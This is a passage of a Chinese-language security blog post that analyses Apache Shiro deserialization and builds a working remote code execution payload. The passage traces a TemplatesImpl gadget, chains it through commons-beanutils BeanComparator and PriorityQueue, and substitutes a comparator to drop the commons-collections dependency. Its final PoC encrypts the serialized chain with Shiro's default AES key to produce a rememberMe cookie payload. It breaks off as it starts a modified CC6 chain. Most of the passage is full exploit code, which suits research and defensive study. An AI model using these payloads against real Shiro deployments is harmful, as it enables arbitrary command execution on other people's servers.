src="/img/markdown-img-paste-20211126143332141.png"></p><p>分析代码，发现同时需要满足以下条件</p><ul><li>_name值不为零</li><li>_bytecodes中字节码所包含的类需要继承AbstractTranslet类(因为这里有一个强制转换)</li></ul><p>但由于getTransletInstance是一个私有方法，因此还需要找getTransletInstance的被调情况</p><h3 id="newTransformer"><a href="#newTransformer" class="headerlink" title="newTransformer"></a>newTransformer</h3><p>在newTransformer找到getTransletInstance的调用</p><p><img src="/img/markdown-img-paste-20211126105027463.png"></p><p>测试代码</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">public static void set<span class="hljs-constructor">FieldValue(Object <span class="hljs-params">obj</span>, String <span class="hljs-params">fieldName</span>, Object <span class="hljs-params">value</span>)</span> throws Exception &#123;<br>    Field field = obj.get<span class="hljs-constructor">Class()</span>.get<span class="hljs-constructor">DeclaredField(<span class="hljs-params">fieldName</span>)</span>;<br>    field.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;<br>    field.set(obj, value);<br>&#125;<br><br>public static void main(String<span class="hljs-literal">[]</span> argv) throws Exception&#123;<br>    TemplatesImpl templates = <span class="hljs-keyword">new</span> <span class="hljs-constructor">TemplatesImpl()</span>;<br>    set<span class="hljs-constructor">FieldValue(<span class="hljs-params">templates</span>,<span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-params">new</span> <span class="hljs-params">byte</span>[][]&#123; ClassPool.<span class="hljs-params">getDefault</span>()</span>.get(<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">EvilClass</span>.</span></span><span class="hljs-keyword">class</span>.get<span class="hljs-constructor">Name()</span>).<span class="hljs-keyword">to</span><span class="hljs-constructor">Bytecode()</span>&#125;);<br>    set<span class="hljs-constructor">FieldValue(<span class="hljs-params">templates</span>,<span class="hljs-string">&quot;_name&quot;</span>,<span class="hljs-string">&quot;HelloTemplatesImpl&quot;</span>)</span>;<br>    set<span class="hljs-constructor">FieldValue(<span class="hljs-params">templates</span>,<span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-params">new</span> TransformerFactoryImpl()</span>);<br>    templates.<span class="hljs-keyword">new</span><span class="hljs-constructor">Transformer()</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>成功运行计算器</p><h3 id="getOutputProperties"><a href="#getOutputProperties" class="headerlink" title="getOutputProperties"></a>getOutputProperties</h3><p>在getOutputProperties方法中，存在对newTransformer的调用，因此也可以实现利用</p><p><img src="/img/markdown-img-paste-20211126105316758.png"></p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">public static void set<span class="hljs-constructor">FieldValue(Object <span class="hljs-params">obj</span>, String <span class="hljs-params">fieldName</span>, Object <span class="hljs-params">value</span>)</span> throws Exception &#123;<br>    Field field = obj.get<span class="hljs-constructor">Class()</span>.get<span class="hljs-constructor">DeclaredField(<span class="hljs-params">fieldName</span>)</span>;<br>    field.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;<br>    field.set(obj, value);<br>&#125;<br><br>public static void main(String<span class="hljs-literal">[]</span> argv) throws Exception&#123;<br>    TemplatesImpl templates = <span class="hljs-keyword">new</span> <span class="hljs-constructor">TemplatesImpl()</span>;<br>    set<span class="hljs-constructor">FieldValue(<span class="hljs-params">templates</span>,<span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-params">new</span> <span class="hljs-params">byte</span>[][]&#123; ClassPool.<span class="hljs-params">getDefault</span>()</span>.get(<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">EvilClass</span>.</span></span><span class="hljs-keyword">class</span>.get<span class="hljs-constructor">Name()</span>).<span class="hljs-keyword">to</span><span class="hljs-constructor">Bytecode()</span>&#125;);<br>    set<span class="hljs-constructor">FieldValue(<span class="hljs-params">templates</span>,<span class="hljs-string">&quot;_name&quot;</span>,<span class="hljs-string">&quot;HelloTemplatesImpl&quot;</span>)</span>;<br>    set<span class="hljs-constructor">FieldValue(<span class="hljs-params">templates</span>,<span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-params">new</span> TransformerFactoryImpl()</span>);<br>    templates.get<span class="hljs-constructor">OutputProperties()</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>同时由于TemplatesImpl存在_outputProperties变量，因此可以结合commons-beanutils或者fastjson实现一个链式调用。</p><h2 id="PriorityQueue"><a href="#PriorityQueue" class="headerlink" title="PriorityQueue"></a>PriorityQueue</h2><p>PriorityQueue是一个用来处理优先队列的类，位于java.util包中</p><h3 id="readObject"><a href="#readObject" class="headerlink" title="readObject"></a>readObject</h3><p><img src="/img/markdown-img-paste-20211126111845691.png"></p><p>在其中调用了heapify方法</p><h3 id="heapify"><a href="#heapify" class="headerlink" title="heapify"></a>heapify</h3><p><img src="/img/markdown-img-paste-2021112611192302.png"></p><p>调用了siftDown方法</p><h3 id="siftDown"><a href="#siftDown" class="headerlink" title="siftDown"></a>siftDown</h3><p><img src="/img/markdown-img-paste-20211126111949291.png"></p><p>这里有一个判断，判断comparator是否为空，不为空则进入siftDownUsingComparator</p><p>回头看一下PriorityQueue的构造函数<br><img src="/img/markdown-img-paste-20211126112045274.png"></p><p>发现comparator的值在初始化的时候已经赋值</p><h3 id="siftDownUsingComparator"><a href="#siftDownUsingComparator" class="headerlink" title="siftDownUsingComparator"></a>siftDownUsingComparator</h3><p><img src="/img/markdown-img-paste-20211126112132509.png"></p><p>在siftDownUsingComparator中我们可以看到，siftDownUsingComparator对自身数组中的两个值，调用了comparator.compare方法进行比较。属于一个自动化调用</p><h2 id="POC编写"><a href="#POC编写" class="headerlink" title="POC编写"></a>POC编写</h2><p>在前文的分析中，我们可以发现以下情况</p><ul><li>TemplatesImpl中存在getOutputProperties方法，构造好TemplatesImpl对象并实现getOutputProperties的调用可以实现任意代码执行</li><li>commons-beanutils中的PropertyUtils.getProperty(Object bean, String name)方法可以调用bean的get(name)方法</li><li>BeanComparator.compare中存在PropertyUtils.getProperty方法的调用</li><li>PriorityQueue反序列化时可以调用comparator.compare方法</li></ul><p>因此，可以做到一个巧妙的串联</p><p>POC代码</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">package com.javasec.shiro;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;<br><span class="hljs-keyword">import</span> javassist.*;<br><span class="hljs-keyword">import</span> org.apache.commons.beanutils.*;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><br><br><span class="hljs-built_in">public</span> <span class="hljs-keyword">class</span> Test &#123;<br><br>    <span class="hljs-built_in">public</span> static <span class="hljs-keyword">class</span> Evil extends AbstractTranslet &#123;<br>        <span class="hljs-built_in">public</span> <span class="hljs-type">void</span> <span class="hljs-keyword">transform</span>(DOM document, DTMAxisIterator iterator, SerializationHandler <span class="hljs-keyword">handler</span>) &#123;<br>        &#125;<br><br><br>        <span class="hljs-built_in">public</span> <span class="hljs-type">void</span> <span class="hljs-keyword">transform</span>(DOM document, com.sun.org.apache.xml.internal.serializer.SerializationHandler[] handlers) throws TransletException &#123;<br><br>        &#125;<br><br>        <span class="hljs-built_in">public</span> Evil() throws <span class="hljs-keyword">Exception</span>&#123;<br>            Runtime.getRuntime().exec(&quot;calc&quot;);<br>        &#125;<br><br>        <span class="hljs-built_in">public</span> static <span class="hljs-type">void</span> main(String[] args) throws <span class="hljs-keyword">Exception</span> &#123;<br>            EvilClass helloworld = <span class="hljs-built_in">new</span> EvilClass();<br>        &#125;<br><br>    &#125;<br>    <span class="hljs-built_in">public</span> static <span class="hljs-type">void</span> setFieldValue(<span class="hljs-keyword">Object</span> obj, String fieldName, <span class="hljs-keyword">Object</span> <span class="hljs-keyword">value</span>) throws <span class="hljs-keyword">Exception</span> &#123;<br>        Field field = obj.getClass().getDeclaredField(fieldName);<br>        field.setAccessible(<span class="hljs-keyword">true</span>);<br>        field.<span class="hljs-keyword">set</span>(obj, <span class="hljs-keyword">value</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">public</span> static <span class="hljs-type">void</span> main(String[] argv) throws <span class="hljs-keyword">Exception</span>&#123;<br>        TemplatesImpl templates = <span class="hljs-built_in">new</span> TemplatesImpl();<br>        setFieldValue(templates,&quot;_bytecodes&quot;, <span class="hljs-built_in">new</span> byte[][]&#123; ClassPool.getDefault().<span class="hljs-keyword">get</span>(Evil.<span class="hljs-keyword">class</span>.getName()).toBytecode()&#125;);<br>        setFieldValue(templates,&quot;_name&quot;,&quot;HelloTemplatesImpl&quot;);<br>        setFieldValue(templates,&quot;_tfactory&quot;, <span class="hljs-built_in">new</span> TransformerFactoryImpl());<br><br>        BeanComparator beanComparator = <span class="hljs-built_in">new</span> BeanComparator();<br>        PriorityQueue priorityQueue = <span class="hljs-built_in">new</span> PriorityQueue(<span class="hljs-number">2</span>,beanComparator);<br><br>        priorityQueue.<span class="hljs-keyword">add</span>(<span class="hljs-number">1</span>);<br>        priorityQueue.<span class="hljs-keyword">add</span>(<span class="hljs-number">1</span>);<br><br>        setFieldValue(beanComparator,&quot;property&quot;, &quot;outputProperties&quot;);<br>        setFieldValue(priorityQueue,&quot;queue&quot;, <span class="hljs-built_in">new</span> <span class="hljs-keyword">Object</span>[]&#123;templates,templates&#125;);<br><br>        ByteArrayOutputStream barr = <span class="hljs-built_in">new</span> ByteArrayOutputStream();<br>        ObjectOutputStream oos = <span class="hljs-built_in">new</span> ObjectOutputStream(barr);<br>        oos.writeObject(priorityQueue);<br>        oos.<span class="hljs-keyword">close</span>();<br><br>        ObjectInputStream ois = <span class="hljs-built_in">new</span> ObjectInputStream(<span class="hljs-built_in">new</span> ByteArrayInputStream(barr.toByteArray()));<br>        <span class="hljs-keyword">Object</span> o = (<span class="hljs-keyword">Object</span>)ois.readObject();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>成功弹出计算器</p><p>但是这个POC真的就没有任何依赖吗？我们知道commons-beanutils库部份依赖commons-conllections这个库，观察其构造函数</p><p><img src="/img/markdown-img-paste-20211126145104338.png"></p><p>可以看到在没有传入comparator时，或默认调用ComparableComparator.getInstance()方法。而我们跟踪发现，这个方法属于commons-conllections包中的方法</p><p><img src="/img/markdown-img-paste-20211126145204627.png"></p><p>如果我们删除commons-conllections依赖，再运行刚才的POC，就会收获如下错误</p><p><img src="/img/markdown-img-paste-20211126150310555.png"></p><p>因此我们需要找到一个替代的方法<br>它需要满足以下几点</p><ul><li>实现java.util.Comparator接口</li><li>实现java.io.Serializable接口</li><li>Java、shiro或commons-beanutils自带</li></ul><p>根据IDEA得快捷键ctrl+alt+B，可以快速得找到目标类<br>我这里找的是Headers$InsensitiveComparator类<br>实现代码</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">package com.javasec.shiro;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;<br><span class="hljs-keyword">import</span> javassist.*;<br><span class="hljs-keyword">import</span> org.apache.commons.beanutils.*;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.Comparator;<br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><br><br><span class="hljs-built_in">public</span> <span class="hljs-keyword">class</span> Test &#123;<br><br>    <span class="hljs-built_in">public</span> static <span class="hljs-keyword">class</span> Evil extends AbstractTranslet &#123;<br>        <span class="hljs-built_in">public</span> <span class="hljs-type">void</span> <span class="hljs-keyword">transform</span>(DOM document, DTMAxisIterator iterator, SerializationHandler <span class="hljs-keyword">handler</span>) &#123;<br>        &#125;<br><br><br>        <span class="hljs-built_in">public</span> <span class="hljs-type">void</span> <span class="hljs-keyword">transform</span>(DOM document, com.sun.org.apache.xml.internal.serializer.SerializationHandler[] handlers) throws TransletException &#123;<br><br>        &#125;<br><br>        <span class="hljs-built_in">public</span> Evil() throws <span class="hljs-keyword">Exception</span>&#123;<br>            Runtime.getRuntime().exec(&quot;calc&quot;);<br>        &#125;<br><br>        <span class="hljs-built_in">public</span> static <span class="hljs-type">void</span> main(String[] args) throws <span class="hljs-keyword">Exception</span> &#123;<br>            EvilClass helloworld = <span class="hljs-built_in">new</span> EvilClass();<br>        &#125;<br><br>    &#125;<br>    <span class="hljs-built_in">public</span> static <span class="hljs-type">void</span> setFieldValue(<span class="hljs-keyword">Object</span> obj, String fieldName, <span class="hljs-keyword">Object</span> <span class="hljs-keyword">value</span>) throws <span class="hljs-keyword">Exception</span> &#123;<br>        Field field = obj.getClass().getDeclaredField(fieldName);<br>        field.setAccessible(<span class="hljs-keyword">true</span>);<br>        field.<span class="hljs-keyword">set</span>(obj, <span class="hljs-keyword">value</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">public</span> static <span class="hljs-type">void</span> main(String[] argv) throws <span class="hljs-keyword">Exception</span>&#123;<br>        TemplatesImpl templates = <span class="hljs-built_in">new</span> TemplatesImpl();<br>        setFieldValue(templates,&quot;_bytecodes&quot;, <span class="hljs-built_in">new</span> byte[][]&#123; ClassPool.getDefault().<span class="hljs-keyword">get</span>(Evil.<span class="hljs-keyword">class</span>.getName()).toBytecode()&#125;);<br>        setFieldValue(templates,&quot;_name&quot;,&quot;HelloTemplatesImpl&quot;);<br>        setFieldValue(templates,&quot;_tfactory&quot;, <span class="hljs-built_in">new</span> TransformerFactoryImpl());<br><br>        <span class="hljs-keyword">Class</span> clss = <span class="hljs-keyword">Class</span>.forName(&quot;com.sun.xml.internal.ws.transport.Headers$InsensitiveComparator&quot;);<br>        Constructor constructor = clss.getDeclaredConstructor();<br>        constructor.setAccessible(<span class="hljs-keyword">true</span>);<br>        <span class="hljs-keyword">Object</span> ob = constructor.newInstance();<br><br>        BeanComparator beanComparator = <span class="hljs-built_in">new</span> BeanComparator(<span class="hljs-keyword">null</span>, (Comparator) ob);<br>        PriorityQueue priorityQueue = <span class="hljs-built_in">new</span> PriorityQueue(<span class="hljs-number">2</span>,beanComparator);<br><br>        priorityQueue.<span class="hljs-keyword">add</span>(&quot;a&quot;);<br>        priorityQueue.<span class="hljs-keyword">add</span>(&quot;a&quot;);<br><br>        setFieldValue(beanComparator,&quot;property&quot;, &quot;outputProperties&quot;);<br>        setFieldValue(priorityQueue,&quot;queue&quot;, <span class="hljs-built_in">new</span> <span class="hljs-keyword">Object</span>[]&#123;templates,templates&#125;);<br><br>        ByteArrayOutputStream barr = <span class="hljs-built_in">new</span> ByteArrayOutputStream();<br>        ObjectOutputStream oos = <span class="hljs-built_in">new</span> ObjectOutputStream(barr);<br>        oos.writeObject(priorityQueue);<br>        oos.<span class="hljs-keyword">close</span>();<br><br>        ObjectInputStream ois = <span class="hljs-built_in">new</span> ObjectInputStream(<span class="hljs-built_in">new</span> ByteArrayInputStream(barr.toByteArray()));<br>        <span class="hljs-keyword">Object</span> o = (<span class="hljs-keyword">Object</span>)ois.readObject();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>P牛的文章里用的是CaseInsensitiveComparator类，比我的POC更简洁(到底还是老师傅)</p><p><img src="/img/markdown-img-paste-2021112616022676.png"></p><h3 id="最终版"><a href="#最终版" class="headerlink" title="最终版"></a>最终版</h3><p>最后添加上Aes加密和Base64加密</p><p>完整代码</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">package com.javasec.shiro;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;<br><span class="hljs-keyword">import</span> javassist.*;<br><span class="hljs-keyword">import</span> org.apache.commons.beanutils.*;<br><span class="hljs-keyword">import</span> org.apache.shiro.codec.Base64;<br><span class="hljs-keyword">import</span> org.apache.shiro.codec.CodecSupport;<br><span class="hljs-keyword">import</span> org.apache.shiro.crypto.AesCipherService;<br><span class="hljs-keyword">import</span> org.apache.shiro.mgt.AbstractRememberMeManager;<br><span class="hljs-keyword">import</span> org.apache.shiro.util.ByteSource;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.<span class="hljs-keyword">Method</span>;<br><span class="hljs-keyword">import</span> java.util.Comparator;<br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><br><br><span class="hljs-built_in">public</span> <span class="hljs-keyword">class</span> Test &#123;<br><br>    <span class="hljs-built_in">public</span> static <span class="hljs-keyword">class</span> Evil extends AbstractTranslet &#123;<br>        <span class="hljs-built_in">public</span> <span class="hljs-type">void</span> <span class="hljs-keyword">transform</span>(DOM document, DTMAxisIterator iterator, SerializationHandler <span class="hljs-keyword">handler</span>) &#123;<br>        &#125;<br><br><br>        <span class="hljs-built_in">public</span> <span class="hljs-type">void</span> <span class="hljs-keyword">transform</span>(DOM document, com.sun.org.apache.xml.internal.serializer.SerializationHandler[] handlers) throws TransletException &#123;<br><br>        &#125;<br><br>        <span class="hljs-built_in">public</span> Evil() throws <span class="hljs-keyword">Exception</span>&#123;<br>            Runtime.getRuntime().exec(&quot;calc&quot;);<br>        &#125;<br><br>        <span class="hljs-built_in">public</span> static <span class="hljs-type">void</span> main(String[] args) throws <span class="hljs-keyword">Exception</span> &#123;<br>            EvilClass helloworld = <span class="hljs-built_in">new</span> EvilClass();<br>        &#125;<br><br>    &#125;<br>    <span class="hljs-built_in">public</span> static <span class="hljs-type">void</span> setFieldValue(<span class="hljs-keyword">Object</span> obj, String fieldName, <span class="hljs-keyword">Object</span> <span class="hljs-keyword">value</span>) throws <span class="hljs-keyword">Exception</span> &#123;<br>        Field field = obj.getClass().getDeclaredField(fieldName);<br>        field.setAccessible(<span class="hljs-keyword">true</span>);<br>        field.<span class="hljs-keyword">set</span>(obj, <span class="hljs-keyword">value</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">public</span> static <span class="hljs-type">void</span> main(String[] argv) throws <span class="hljs-keyword">Exception</span>&#123;<br>        TemplatesImpl templates = <span class="hljs-built_in">new</span> TemplatesImpl();<br>        setFieldValue(templates,&quot;_bytecodes&quot;, <span class="hljs-built_in">new</span> byte[][]&#123; ClassPool.getDefault().<span class="hljs-keyword">get</span>(Evil.<span class="hljs-keyword">class</span>.getName()).toBytecode()&#125;);<br>        setFieldValue(templates,&quot;_name&quot;,&quot;HelloTemplatesImpl&quot;);<br>        setFieldValue(templates,&quot;_tfactory&quot;, <span class="hljs-built_in">new</span> TransformerFactoryImpl());<br><br>        <span class="hljs-keyword">Class</span> clss = <span class="hljs-keyword">Class</span>.forName(&quot;com.sun.xml.internal.ws.transport.Headers$InsensitiveComparator&quot;);<br>        Constructor constructor = clss.getDeclaredConstructor();<br>        constructor.setAccessible(<span class="hljs-keyword">true</span>);<br>        <span class="hljs-keyword">Object</span> ob = constructor.newInstance();<br><br>        BeanComparator beanComparator = <span class="hljs-built_in">new</span> BeanComparator(<span class="hljs-keyword">null</span>, (Comparator) ob);<br>        PriorityQueue priorityQueue = <span class="hljs-built_in">new</span> PriorityQueue(<span class="hljs-number">2</span>,beanComparator);<br><br>        priorityQueue.<span class="hljs-keyword">add</span>(&quot;a&quot;);<br>        priorityQueue.<span class="hljs-keyword">add</span>(&quot;a&quot;);<br><br>        setFieldValue(beanComparator,&quot;property&quot;, &quot;outputProperties&quot;);<br>        setFieldValue(priorityQueue,&quot;queue&quot;, <span class="hljs-built_in">new</span> <span class="hljs-keyword">Object</span>[]&#123;templates,templates&#125;);<br><br>        ByteArrayOutputStream byteArrayOutputStream = <span class="hljs-built_in">new</span> ByteArrayOutputStream();<br>        ObjectOutputStream <span class="hljs-keyword">out</span> = <span class="hljs-built_in">new</span> ObjectOutputStream(byteArrayOutputStream);<br>        <span class="hljs-keyword">out</span>.writeObject(priorityQueue);<br>        <span class="hljs-keyword">out</span>.<span class="hljs-keyword">close</span>();<br><br>        byte[] bytes = byteArrayOutputStream.toByteArray();<br><br>        AesCipherService aesCipherService = <span class="hljs-built_in">new</span> AesCipherService();<br>        byte[] key = Base64.decode(CodecSupport.toBytes(&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;));<br>        aesCipherService.encrypt(bytes,key);<br>        ByteSource ciphertext = aesCipherService.encrypt(bytes, key);<br>        java.util.Base64.Encoder base = java.util.Base64.getEncoder();<br>        <span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println(base.encodeToString(ciphertext.getBytes()));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="有依赖的Payload构造"><a href="#有依赖的Payload构造" class="headerlink" title="有依赖的Payload构造"></a>有依赖的Payload构造</h1><p>在前文，我们分析到，shiro重写了resolveClass关键实现变为<code>ClassUtils.forName(osc.getName());</code></p><p>这就导致了我们在利用链在不能存在数组</p><p>因此我们需要找一个无需数组的利用链</p><p>由于自带的cc版本为3.2.1，且java版本高于8u71，因此选用cc6的链进行改造</p><h2 id="InvokerTransformer"><a href="#InvokerTransformer" class="headerlink" title="InvokerTransformer"></a>InvokerTransformer</h2><p>在之前的cc6链分析中，我们知道，cc6的后半段利用的是ChainedTransformer数组</p><p>而ChainedTransformer数组本质上还是调用InvokerTransformer函数反射调用执行具体函数(如Runtime.exec)</p><p>因此如果我们绕过ChainedTransformer数组，直接使用InvokerTransformer方法，就可以绕过数组限制。</p><p>在之前对TemplateImpl的研究中，我们知道，不仅getoutputProperties方法可以触发LoadClass，newTransformer同样也可以触发，所以我们结合InvokerTransformer和TemplateImpl#newTransformer，可以达到绕过数组执行命令</p><h2 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h2><p>为了验证我们的猜想，测试如下代码</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span 